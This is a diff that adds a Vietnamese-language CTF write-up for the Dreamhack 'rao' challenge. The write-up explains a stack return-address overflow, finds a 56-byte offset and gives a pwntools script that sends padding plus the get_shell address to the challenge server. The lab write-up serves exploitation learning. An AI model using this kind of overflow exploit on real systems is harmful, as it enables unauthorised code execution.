@@ -228,7 +228,9 @@ r.interactive()
 </details>
 
 # Return address overflow
+
 ## Source C
+
 ```c
 // Name: rao.c
 // Compile: gcc -o rao rao.c -fno-stack-protector -no-pie
@@ -259,6 +261,32 @@ int main() {
   return 0;
 }
 ```
+
+## Ý tưởng
+
+- ta checksec không có canary, có hàm tạo shell, scanf() không giới hạn kí tự nhập vào
+
+## Khai thác
+
+- Ta tìm offset để ow rbp là 56
+
+```python
+from pwn import *
+
+exe = ELF("./rao")
+# r = process(exe.path)
+r = remote("host3.dreamhack.games", 13521)
+
+payload = b"a" * 56 + p64(exe.sym['get_shell'])
+
+r.sendlineafter(b"Input: ", payload)
+r.interactive()
+```
+
+## Kết quả
+
+![image](https://user-images.githubusercontent.com/111769169/227600958-9ec62751-4e4d-42a0-ad9f-0de489a80fb5.png)
+
 # basic_exploitation_003
 
 ## Source C
